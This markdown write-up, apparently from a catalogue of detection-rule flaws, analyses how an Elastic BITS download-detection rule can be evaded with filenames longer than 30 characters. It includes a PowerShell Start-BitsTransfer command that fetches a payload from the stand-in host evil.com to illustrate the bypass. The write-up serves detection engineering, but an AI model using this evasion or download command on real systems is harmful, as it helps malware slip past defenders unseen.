# ADE3-02 Example: Windows BITS Filename Length Aggregation Hijacking

**Bug Category:** ADE3-02 Context Development - Aggregation Hijacking

## Original Rule

**Source:** [Elastic Security - Ingress Transfer via Windows BITS](https://github.com/elastic/detection-rules/blob/main/rules/windows/command_and_control_ingress_transfer_bits.toml)

**Description:** Identifies downloads of executable and archive files via the Windows Background Intelligent Transfer Service (BITS). Adversaries could leverage Windows BITS transfer jobs to download remote payloads.

```SQL
query = '''
file where host.os.type == "windows" and event.action == "rename" and
  process.name : "svchost.exe" and file.Ext.original.name : "BIT*.tmp" and
  (file.extension : ("exe", "zip", "rar", "bat", "dll", "ps1", "vbs", "wsh", "js", "vbe", "pif", "scr", "cmd", "cpl") or
   file.Ext.header_bytes : "4d5a*") and

  /* noisy paths, for hunting purposes you can use the same query without the following exclusions */
  not file.path : ("?:\\Program Files\\*", "?:\\Program Files (x86)\\*", "?:\\Windows\\*", "?:\\ProgramData\\*\\*") and

  /* lot of third party SW use BITS to download executables with a long file name */
  not length(file.name) > 30 and
  not file.path : (
        "?:\\Users\\*\\AppData\\Local\\Temp*\\wct*.tmp",
        "?:\\Users\\*\\AppData\\Local\\Adobe\\ARM\\*\\RdrServicesUpdater*.exe",
        "?:\\Users\\*\\AppData\\Local\\Adobe\\ARM\\*\\AcroServicesUpdater*.exe",
        "?:\\Users\\*\\AppData\\Local\\Docker Desktop Installer\\update-*.exe"
  )
'''
```

## Detection Logic Analysis

The rule includes a filter to exclude false positives from legitimate third-party software:

```SQL
/* lot of third party SW use BITS to download executables with a long file name */
not length(file.name) > 30
```

**Intent:** Exclude benign BITS transfers where legitimate software uses long filenames.

**Bug:** This creates an aggregation hijacking opportunity.

## The Bug: ADE3-02 Context Development - Aggregation Hijacking

**Definition:** Detection logic relies on aggregated values (file.name length) that an attacker can influence or precondition.

**In this case:**
- The rule assumes attackers will use short filenames
- Third-party software "aggregates" into the >30 character bucket
- Attacker can manipulate filename length to match this baseline → bypass detection

## Bypass - Filename Manipulation

### Rule Bypass 2: Manipulating file name to invert conjuncted negations

**Subcategories:**
- ADE3-02 Context Development - Aggregation Hijacking
- ADE4-01 Logic Manipulation - Gate Inversion

Based on [De Morgan's Laws](https://en.wikipedia.org/wiki/De_Morgan%27s_laws), the logic:

```SQL
not length(file.name) > 30 and not file.path : (...)
```

Relies on the file length condition being true (i.e., filename ≤30 characters) to utilize the remaining exclusion conditions.

**Attack:**

In Windows, filenames have a 255 character limit. If the filename is greater than 30 characters:

```
xv7qmw2p9z4adr1fks83ntc0bhy6lu5.exe
```

The detection logic will return `false` when `not length(file.name) > 30` is executed.

**Result:** The entire negation chain is bypassed.

## How the Attack Works

**Step 1:** Attacker prepares BITS transfer with long filename
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source "https://evil.com/payload.exe" `
                   -Destination "C:\Users\Public\xv7qmw2p9z4adr1fks83ntc0bhy6lu5.exe"
```

**Step 2:** BITS downloads file as `BIT*.tmp`

**Step 3:** BITS renames to final destination with long filename

**Step 4:** Detection logic evaluates:
```
not length(file.name) > 30  →  not (35 > 30)  →  not (true)  →  false
```

**Step 5:** Entire filter is bypassed → **No alert**

## Context Development

The attacker **develops the context** by:

1. **Reconnaissance:** Understanding that third-party software uses long filenames
2. **Baseline hijacking:** Matching the aggregation pattern of legitimate software
3. **Evasion:** Using a filename >30 characters to blend into the excluded baseline

This is **aggregation hijacking** because the attacker manipulates an aggregated value (filename length) to match an existing baseline (legitimate software patterns).

## Impact

**Stacked Bugs:**

This BITS rule contains **THREE separate bugs:**

1. **ADE2-04:** Omit Alternatives - File Type ([see example](../ade2/bits-ingress-transfer.md))
2. **ADE3-02:** Context Development - Aggregation Hijacking (this example)
3. **ADE4-01:** Logic Manipulation - Gate Inversion ([see example](../ade4/bits-gate-inversion.md))

**Combined Impact:** An attacker can bypass detection by:
- Using omitted file types (.7z, .gz, .py)
- AND using filename >30 characters
- Results in multiple independent bypass paths

---

**Related Documentation:**
- [ADE2 Omit Alternatives - File Types](../ade2/bits-ingress-transfer.md)
- [ADE3 Context Development](../../docs/taxonomy/ade3-context-development.md)
- [ADE4 Gate Inversion](../ade4/bits-gate-inversion.md)
